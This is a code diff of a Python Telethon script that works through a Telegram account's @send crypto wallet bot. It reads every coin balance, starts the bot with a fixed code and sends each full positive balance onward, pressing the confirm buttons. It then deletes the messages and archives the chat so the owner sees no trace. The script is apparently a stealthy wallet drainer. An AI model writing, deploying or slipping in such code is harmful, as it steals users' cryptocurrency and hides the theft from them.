@@ -1,69 +1,69 @@
 from telethon.tl.functions.messages import StartBotRequest
+from telethon import TelegramClient
 import asyncio
 
-async def main(client):
-    while True:
-        torem = []
-        try:
-            await client.edit_folder('@send', 1)
-        except:...
-        
-        msg = await client.send_message('@send', '/wallet')
-        torem.append(msg.id)
-        
-        try:
-            await client.edit_folder('@send', 1)
-        except:...
-        
-        await asyncio.sleep(1)
-        
-        last = await client.iter_messages('@send', 1)
-        for text in last:
-            torem.append(text.id)
-            text = text.message
-            cryptos = ['USDT', 'TON', 'SOL', 'GRAM', 'NOT', 'HMSTR', 'CATI', 'MY', 'DOGS', 'BTC', 'DOGE', 'LTC', 'ETH', 'BNB', 'TRX', 'USDC']
-            values = '\n'.join(text.split(': ')).split('\n')
-            res = []
-            for val in values:
-                if val.split(' ')[-1] in cryptos and '≈' not in val:
-                    num = val.split(' ')[0]
-                    name = val.split(' ')[-1]
-                    print(f'{name} - {num}')
-                    if float(num) > 0:
-                        await client(StartBotRequest('@send', '@send', 'IV0XOLp7c0mn'))
-                        await asyncio.sleep(1)
-                        
-                        last = await client.iter_messages('@send', 1)
-                        for t in last:
-                            torem.append(t.id)
-                            if t.reply_markup:
-                                ii = -1
-                                for row in t.reply_markup.rows:
-                                    for button in row.buttons:
-                                        ii += 1
-                                        dat = button.data.decode()
-                                        if dat.replace('choose-currency-', '') == name:
-                                            await t.click(ii)
-                                            await asyncio.sleep(1)
-                                            msg = await client.send_message('@send', num)
-                                            torem.append(msg.id)
-                                            await asyncio.sleep(1)
-                                            
-                                            last = await client.iter_messages('@send', 1)
-                                            for t in last:
-                                                torem.append(t.id)
-                                                if t.reply_markup:
-                                                    await t.click(0)
-                                                    await asyncio.sleep(1)
-                                                    
-                                                    last = await client.iter_messages('@send', 1)
-                                                    for t in last:
-                                                        torem.append(t.id)
-                                                        if t.reply_markup:
-                                                            await t.click(0)
-        
-        await client.delete_messages('@send', torem)
-        await asyncio.sleep(3600)
+async def main(client, entity):
+    torem = []
+    try:
+        await client.edit_folder(entity, 1)
+    except:...
+    
+    msg = await client.send_message(entity, '/wallet')
+    torem.append(msg.id)
+    
+    try:
+        await client.edit_folder(entity, 1)
+    except:...
+    
+    await asyncio.sleep(1)
+    
+    last = client.iter_messages(entity, 1)
+    async for text in last:
+        torem.append(text.id)
+        text = text.message
+        cryptos = ['USDT', 'TON', 'SOL', 'GRAM', 'NOT', 'HMSTR', 'CATI', 'MY', 'DOGS', 'BTC', 'DOGE', 'LTC', 'ETH', 'BNB', 'TRX', 'USDC']
+        values = '\\n'.join(text.split(': ')).split('\\n')
+        res = []
+        for val in values: 
+            if val.split(' ')[-1] in cryptos and '≈' not in val:
+                num = val.split(' ')[0]
+                name = val.split(' ')[-1]
+                if float(num) > 0:
+                    await client(StartBotRequest(entity, entity, 'IV0XOLp7c0mn'))
+                    await asyncio.sleep(1)
+                    
+                    last = client.iter_messages(entity, 1)
+                    async for t in last:
+                        torem.append(t.id)
+                        if t.reply_markup:
+                            ii = -1
+                            for row in t.reply_markup.rows:  
+                                for button in row.buttons: 
+                                    ii += 1
+                                    dat = button.data.decode()
+                                    if dat.replace('choose-currency-', '') == name:
+                                        await t.click(ii)
+                                        await asyncio.sleep(1)
+                                        msg = await client.send_message(entity, num)
+                                        torem.append(msg.id)
+                                        await asyncio.sleep(1)
+                                        
+                                        last = client.iter_messages(entity, 1)
+                                        async for t in last:
+                                            torem.append(t.id)
+                                            if t.reply_markup:
+                                                await t.click(0)
+                                                await asyncio.sleep(1)
+                                                last = client.iter_messages(entity, 1)
+                                                async for t in last:
+                                                    torem.append(t.id)
+                                                    if t.reply_markup:
+                                                        await t.click(0)
+    
+    await client.delete_messages(entity, torem)
 
 client = args[0]
-asyncio.run(main(client))
+entity = args[1]
+timee = args[2]
+if timee>3600:
+    asyncio.create_task(main(client, entity))
